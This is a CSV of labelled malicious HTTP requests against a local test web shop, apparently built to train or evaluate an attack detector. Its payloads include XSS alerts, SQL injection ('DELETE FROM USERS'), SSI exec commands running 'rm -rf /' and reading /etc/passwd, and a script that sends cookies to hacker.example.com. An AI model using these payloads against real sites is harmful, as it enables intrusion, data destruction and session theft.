request_id,url,payload,detected_language,is_unsafe,payload_length,num_special_chars,url_depth,lang_match,precision_m1,recall_m1,fpr_m1,fnr_m1
5eabb462,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,,1,89,0,5,0,100.0,100.0,-99.0,-99.0
f42483b1,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=ashrae&password=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&nombre=Yerald%ED&apellidos=Uca%F1ay&email=garet%40decsl.mg&dni=47175260Y&direccion=Calle+Adelardo+Covarsi+138+&ciudad=Santib%E1%F1ez+de+la+Pe%F1a&cp=08150&provincia=C%E1ceres&ntc=2464400659124948&B1=Registrar,,1,309,0,5,0,100.0,100.0,-99.0,-99.0
5e3e0324,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=levon&pwd=ca%F1ucela%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&remember=on&B1=Entrar,,1,132,0,5,0,100.0,100.0,-99.0,-99.0
9f2ed388,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carritobob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,,1,97,0,5,0,100.0,100.0,-99.0,-99.0
63366fad,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&login=mehlhaff&pwd=23m6%E9&remember=on&B1=Entrar,,1,118,0,5,0,100.0,100.0,-99.0,-99.0
6bb122c9,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectasbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,,1,97,0,5,0,100.0,100.0,-99.0,-99.0
6bb122c9,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectasbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,,1,97,0,5,0,100.0,100.0,-99.0,-99.0
6a1b8a0d,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Jam%F3n+Ib%E9rico%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&precio=39&cantidad=81&B1=A%F1adir+al+carrito,,1,126,0,5,0,100.0,100.0,-99.0,-99.0
af77d21a,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,,1,61,0,5,0,100.0,100.0,-99.0,-99.0
9246c98a,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,,1,67,0,5,0,100.0,100.0,-99.0,-99.0
7aeb1c25,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,,1,75,0,5,0,100.0,100.0,-99.0,-99.0
48431f16,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&B1=A%F1adir+al+carrito,,1,144,0,5,0,100.0,100.0,-99.0,-99.0
c6d5961f,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&precio=5003&B1=Confirmar,,1,110,0,5,0,100.0,100.0,-99.0,-99.0
b77df877,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&B1=Confirmar,,1,114,0,5,0,100.0,100.0,-99.0,-99.0
ac4f6216,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=checinsk&password=c2ad953u8ro&nombre=Neria&apellidos=Taronger&email=torgov-mattera%40yksoluap.edu&dni=74014005M&direccion=Avenida+Roque+De+Gando%2C+193%2C+7%3FE&ciudad=Castrobol&cp=26324&provincia=Cuenca&ntc=5680554856223107%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&B1=Registrar,,1,309,0,5,0,100.0,100.0,-99.0,-99.0
0c62b362,http://localhost:8080/tienda1/publico/pagar.jsp,modo=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&precio=9353&B1=Confirmar,,1,82,0,5,0,100.0,100.0,-99.0,-99.0
5eabb462,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,,1,89,0,5,0,100.0,100.0,-99.0,-99.0
7da34790,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectasbob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,,1,113,0,5,0,100.0,100.0,-99.0,-99.0
eee28547,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&password=pis7ar&nombre=Tristana&apellidos=Isart+Viva&email=rae%40ajuntamentbarcelona20.kg&dni=47182191Z&direccion=C%2F+Argullos+73%2C+9%3FA&ciudad=Figueruelas&cp=49655&provincia=A+Coru%F1a&ntc=3983167726534410&B1=Registrar,,1,323,0,5,0,100.0,100.0,-99.0,-99.0
af77d21a,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,,1,61,0,5,0,100.0,100.0,-99.0,-99.0
f0719397,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&pwd=%F112%F1a&remember=on&B1=Entrar,,1,118,0,5,0,100.0,100.0,-99.0,-99.0
6e6d009d,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=rajan&password=paLmear&nombre=Amparo&apellidos=Martin+Bansells&email=hampden-baker8%40unidadesdeventilacion.cy&dni=48800601Y&direccion=Calle+Formentera%2C+184+4-C&ciudad=San+Garc%EDa+de+Ingelmos&cp=37129&provincia=Burgos&ntc=1524098225377304&B1=Registrarbob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,,1,354,0,5,0,100.0,100.0,-99.0,-99.0
2ca0d261,http://localhost:8080/tienda1/miembros/editar.jsp,B2=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,,1,83,0,5,0,100.0,100.0,-99.0,-99.0
6bb122c9,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectasbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,,1,97,0,5,0,100.0,100.0,-99.0,-99.0
9b4496d1,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,,1,89,0,5,0,100.0,100.0,-99.0,-99.0
5eabb462,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,,1,89,0,5,0,100.0,100.0,-99.0,-99.0
8b6669af,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,,1,73,0,5,0,100.0,100.0,-99.0,-99.0
8a3260c9,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,,1,55,0,5,0,100.0,100.0,-99.0,-99.0
1aa1e211,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=romeo&password=DI26MI61&nombre=Lupo&apellidos=Planells+Teixid%F3&email=mcglory_natalia%40asesoriaviesca.sh&dni=84720383K&direccion=Pontillon%2C+162%2C+1G&ciudad=Navaquesera&cp=19390&provincia=Sevilla&ntc=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&B1=Registrar,,1,301,0,5,0,100.0,100.0,-99.0,-99.0
7b28a8ee,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,,1,85,0,5,0,100.0,100.0,-99.0,-99.0
03fe5047,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=dedie&pwd=M50879RIST44&remember=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&B1=Entrar,,1,124,0,5,0,100.0,100.0,-99.0,-99.0
f2152b7b,http://localhost:8080/tienda1/publico/pagar.jsp,errorMsg=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,,1,81,0,5,0,100.0,100.0,-99.0,-99.0
66e5b3e8,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=nevinbob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&pwd=DEsGRADuAR&remember=on&B1=Entrar,,1,140,0,5,0,100.0,100.0,-99.0,-99.0
7f29416e,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=kathybob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&pwd=en4ocar&remember=on&B1=Entrar,,1,137,0,5,0,100.0,100.0,-99.0,-99.0
9b4496d1,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,,1,89,0,5,0,100.0,100.0,-99.0,-99.0
1d7f4856,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=6858&B1=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,,1,109,0,5,0,100.0,100.0,-99.0,-99.0
bb9525ac,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=keene-mo&password=DEs2l0bear&nombre=Florio&apellidos=Alcalde+Rybensky&email=bobenko-steimaroua%40926.lb&dni=65834957X&direccion=C%2F+Leganes%2C+74+bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&ciudad=Sant+Miquel+de+Campmajor&cp=42138&provincia=Huesca&ntc=7967092459392219&B1=Registrar,,1,339,0,5,0,100.0,100.0,-99.0,-99.0
887f8062,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=keene-mo&password=DEs2l0bear&nombre=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&apellidos=Alcalde+Rybensky&email=bobenko-steimaroua%40926.lb&dni=65834957X&direccion=C%2F+Leganes%2C+74+&ciudad=Sant+Miquel+de+Campmajor&cp=42138&provincia=Huesca&ntc=7967092459392219&B1=Registrar,,1,333,0,5,0,100.0,100.0,-99.0,-99.0
9246c98a,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,,1,67,0,5,0,100.0,100.0,-99.0,-99.0
98a84d68,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,,1,69,0,5,0,100.0,100.0,-99.0,-99.0
dba78a45,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=%27+DELETE+FROM+USERS,,1,24,0,5,0,100.0,100.0,-99.0,-99.0
dba78a45,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=%27+DELETE+FROM+USERS,,1,24,0,5,0,100.0,100.0,-99.0,-99.0
dba78a45,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=%27+DELETE+FROM+USERS,,1,24,0,5,0,100.0,100.0,-99.0,-99.0
4e248987,http://localhost:8080/tienda1/publico/pagar.jsp,modo=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&precio=7105&B1=Pasar+por+caja,,1,599,0,5,0,100.0,100.0,-99.0,-99.0
dba78a45,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=%27+DELETE+FROM+USERS,,1,24,0,5,0,100.0,100.0,-99.0,-99.0
b0ca6894,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=%27+DELETE+FROM+USERS,,1,24,0,5,0,100.0,100.0,-99.0,-99.0
b0ca6894,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=%27+DELETE+FROM+USERS,,1,24,0,5,0,100.0,100.0,-99.0,-99.0
87444a13,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%27+DELETE+FROM+USERS,,1,30,0,5,0,100.0,100.0,-99.0,-99.0
1dd08577,http://localhost:8080/tienda1/miembros/editar.jsp,B2=%27+DELETE+FROM+USERS,,1,24,0,5,0,100.0,100.0,-99.0,-99.0
4223a1cb,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=Pasar+por+caja,,1,209,0,5,0,100.0,100.0,-99.0,-99.0
097dc36b,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=%27+DELETE+FROM+USERS&precio=39&cantidad=63&B1=A%F1adir+al+carrito,,1,78,0,5,0,100.0,100.0,-99.0,-99.0
f8afdaf5,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=Queso+Manchego&precio=%27+DELETE+FROM+USERS&cantidad=18&B1=A%F1adir+al+carrito,,1,90,0,5,0,100.0,100.0,-99.0,-99.0
21090d10,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=1%27+DELETE+FROM+USERS,,1,25,0,5,0,100.0,100.0,-99.0,-99.0
2a67bcff,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&B1=Pasar+por+caja,,1,105,0,5,0,100.0,100.0,-99.0,-99.0
dc470541,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=%22+AND+%221%22%3D%221&B1=Pasar+por+caja,,1,61,0,5,0,100.0,100.0,-99.0,-99.0
9c841a6e,http://localhost:8080/tienda1/publico/registro.jsp,modo=%27+DELETE+FROM+USERS&login=terrye&password=lombriguera&nombre=Policarpa&apellidos=Susanibar+Nolla&email=kortner%40vitalhome.cl&dni=40604241H&direccion=Avda.+Del+Municipi%2C+45%2C+&ciudad=Arona&cp=19144&provincia=M%E1laga&ntc=4253633913747340&B1=Registrar,,1,260,0,5,0,100.0,100.0,-99.0,-99.0
87444a13,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%27+DELETE+FROM+USERS,,1,30,0,5,0,100.0,100.0,-99.0,-99.0
87444a13,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%27+DELETE+FROM+USERS,,1,30,0,5,0,100.0,100.0,-99.0,-99.0
64a53339,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=plsntp1&password=c%21uartilludo&nombre=Generosa&apellidos=Obrador+Scolari&email=metanee4%40martosfutbolsala.us&dni=55023331V&direccion=Cuesta+De+La+Independencia+107+7%3FH&ciudad=Bastida%2C+La&cp=50268&provincia=Guadalajara&ntc=7559315491846404sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=Registrar,,1,447,0,5,0,100.0,100.0,-99.0,-99.0
b2714c8f,http://localhost:8080/tienda1/publico/pagar.jsp,modo=%22+AND+%221%22%3D%221&precio=7061&B1=Pasar+por+caja,,1,57,0,5,0,100.0,100.0,-99.0,-99.0
9396506c,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=%27+DELETE+FROM+USERS,,1,24,0,5,0,100.0,100.0,-99.0,-99.0
e69d0b70,http://localhost:8080/tienda1/publico/pagar.jsp,modo=%27+DELETE+FROM+USERS&precio=806&B1=Confirmar,,1,50,0,5,0,100.0,100.0,-99.0,-99.0
9396506c,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=%27+DELETE+FROM+USERS,,1,24,0,5,0,100.0,100.0,-99.0,-99.0
31342ee5,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=crickard&pwd=%27+DELETE+FROM+USERS&remember=off&B1=Entrar,,1,75,0,5,0,100.0,100.0,-99.0,-99.0
87444a13,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%27+DELETE+FROM+USERS,,1,30,0,5,0,100.0,100.0,-99.0,-99.0
509c1b2d,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=hamilton&password=178gaTorIO&nombre=%27+DELETE+FROM+USERS&apellidos=Maquieira+San+Segundo&email=glaessner-alwood%40softwaremasservicio.ic&dni=29189199Z&direccion=Redonda%2C+142%2C+13-G&ciudad=R%E1bade&cp=08673&provincia=Le%F3n&ntc=7739977532136253&B1=Registrar,,1,280,0,5,0,100.0,100.0,-99.0,-99.0
24655b24,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=2%27+DELETE+FROM+USERS,,1,25,0,5,0,100.0,100.0,-99.0,-99.0
24655b24,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=2%27+DELETE+FROM+USERS,,1,25,0,5,0,100.0,100.0,-99.0,-99.0
21d4a4d6,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=%27+DELETE+FROM+USERS&precio=39&cantidad=74&B1=A%F1adir+al+carrito,,1,78,0,5,0,100.0,100.0,-99.0,-99.0
87444a13,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%27+DELETE+FROM+USERS,,1,30,0,5,0,100.0,100.0,-99.0,-99.0
f20fac91,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=nataniel&password=53rD11c4&nombre=Ligia&apellidos=Klindt+Vanega&email=cordon4%40hojainformativas.je&dni=96785368B&direccion=Pintor+Clemente+De+Torres+169+&ciudad=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&cp=09125&provincia=Guadalajara&ntc=2447487443590870&B1=Registrar,,1,313,0,5,0,100.0,100.0,-99.0,-99.0
24655b24,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=2%27+DELETE+FROM+USERS,,1,25,0,5,0,100.0,100.0,-99.0,-99.0
87444a13,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%27+DELETE+FROM+USERS,,1,30,0,5,0,100.0,100.0,-99.0,-99.0
db1c4898,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=1881%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&B1=Pasar+por+caja,,1,109,0,5,0,100.0,100.0,-99.0,-99.0
24655b24,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=2%27+DELETE+FROM+USERS,,1,25,0,5,0,100.0,100.0,-99.0,-99.0
24655b24,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=2%27+DELETE+FROM+USERS,,1,25,0,5,0,100.0,100.0,-99.0,-99.0
0ed90d2f,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=nitin&password=r4mitir&nombre=Lionel&apellidos=Teixidor+Modrego&email=creach%40vindexexpo.gr&dni=37118814B&direccion=C%2F+Joaquin+Arjona+70%2C+&ciudad=Rionegro+del+Puente&cp=49639&provincia=Barcelona&ntc=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&B1=Registrar,,1,303,0,5,0,100.0,100.0,-99.0,-99.0
b4033103,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Queso+Manchego&precio=39&cantidad=%27+DELETE+FROM+USERS&B1=A%F1adir+al+carrito,,1,90,0,5,0,100.0,100.0,-99.0,-99.0
0ae2c24a,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=Queso+Manchego&precio=100&cantidad=%27+DELETE+FROM+USERS&B1=A%F1adir+al+carrito,,1,91,0,5,0,100.0,100.0,-99.0,-99.0
05d32e29,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=pardo&password=S2r44n9sa&nombre=%27+DELETE+FROM+USERS&apellidos=Abad+Palomo&email=alonzo%40colorprint.eh&dni=44696230P&direccion=Pl.+Primero+De+Mayo+S%2FN%2C+11F&ciudad=Albal%E1&cp=29493&provincia=Soria&ntc=1165920681066048&B1=Registrar,,1,256,0,5,0,100.0,100.0,-99.0,-99.0
db67a1cf,http://localhost:8080/tienda1/publico/anadir.jsp,id=3%27+DELETE+FROM+USERS&nombre=Queso+Manchego&precio=100&cantidad=14&B1=A%F1adir+al+carrito,,1,93,0,5,0,100.0,100.0,-99.0,-99.0
dad80f1e,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=%27+DELETE+FROM+USERS&precio=39&cantidad=21&B1=A%F1adir+al+carrito,,1,78,0,5,0,100.0,100.0,-99.0,-99.0
234916ae,http://localhost:8080/tienda1/publico/anadir.jsp,id=2%27+DELETE+FROM+USERS&nombre=Queso+Manchego&precio=39&cantidad=98&B1=A%F1adir+al+carrito,,1,92,0,5,0,100.0,100.0,-99.0,-99.0
150d8c20,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=%27+DELETE+FROM+USERS&password=restitutorio&nombre=HuilliManque&apellidos=Cure+Lozana&email=nathenson1%40sandrasummer.sy&dni=47051425A&direccion=C%2F+Lebrillo%2C+155%2C+4-A&ciudad=Olmedo+de+Camaces&cp=44589&provincia=Valladolid&ntc=6933033673510667&B1=Registrar,,1,281,0,5,0,100.0,100.0,-99.0,-99.0
0e3911f8,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=montijo&password=remot4&nombre=Mailena&apellidos=Buj+Andunce&email=griffel%40camilafansite.pt&dni=93865245Zsessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&direccion=Doctor+Ulecia%2C+158+&ciudad=Valdunquillo&cp=31498&provincia=Tarragona&ntc=5319876028160549&B1=Registrar,,1,412,0,5,0,100.0,100.0,-99.0,-99.0
d57593cd,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=3858&B1=Pasar+por+caja%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,,1,109,0,5,0,100.0,100.0,-99.0,-99.0
fa42e205,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=622%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&B1=Pasar+por+caja,,1,108,0,5,0,100.0,100.0,-99.0,-99.0
609f4847,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=dawn8&password=0H8bUQu%CD&nombre=Quinciano&apellidos=Manzanera+Agudo&email=%27+DELETE+FROM+USERS&dni=11051114M&direccion=C%2F+Poceros%2C+29%2C+&ciudad=Anna&cp=37797&provincia=Ourense&ntc=5688192527960477&B1=Registrar,,1,236,0,5,0,100.0,100.0,-99.0,-99.0
c30d2f6e,http://localhost:8080/tienda1/publico/pagar.jsp,modo=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&precio=2939&B1=Pasar+por+caja,,1,205,0,5,0,100.0,100.0,-99.0,-99.0
87444a13,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%27+DELETE+FROM+USERS,,1,30,0,5,0,100.0,100.0,-99.0,-99.0
74128441,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Jam%F3n+Ib%E9rico&precio=%27+DELETE+FROM+USERS&cantidad=50&B1=A%F1adir+al+carrito,,1,93,0,5,0,100.0,100.0,-99.0,-99.0
af79a3bd,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=%27+DELETE+FROM+USERS&pwd=41tt8&remember=on&B1=Entrar,,1,71,0,5,0,100.0,100.0,-99.0,-99.0
9396506c,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=%27+DELETE+FROM+USERS,,1,24,0,5,0,100.0,100.0,-99.0,-99.0
87444a13,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%27+DELETE+FROM+USERS,,1,30,0,5,0,100.0,100.0,-99.0,-99.0
cfade2e8,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=1202%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&B1=Pasar+por+caja,,1,109,0,5,0,100.0,100.0,-99.0,-99.0
b0f14194,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=devore&password=%27+DELETE+FROM+USERS&nombre=Agripino&apellidos=Verge+Unza&email=bucci%40quehaces.jobs&dni=60737010J&direccion=C%2F+Ignacio+Alvarez+Castelao+63%2C+&ciudad=Bobor%E1s&cp=26585&provincia=Albacete&ntc=4362098450410564&B1=Registrar,,1,262,0,5,0,100.0,100.0,-99.0,-99.0
225827d6,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=2612sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=Pasar+por+caja,,1,213,0,5,0,100.0,100.0,-99.0,-99.0
bd9c8bdf,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%27+DELETE+FROM+USERS,,1,30,0,5,0,100.0,100.0,-99.0,-99.0
88de9e90,http://localhost:8080/tienda1/miembros/editar.jsp,B2=%27+DELETE+FROM+USERS,,1,24,0,5,0,100.0,100.0,-99.0,-99.0
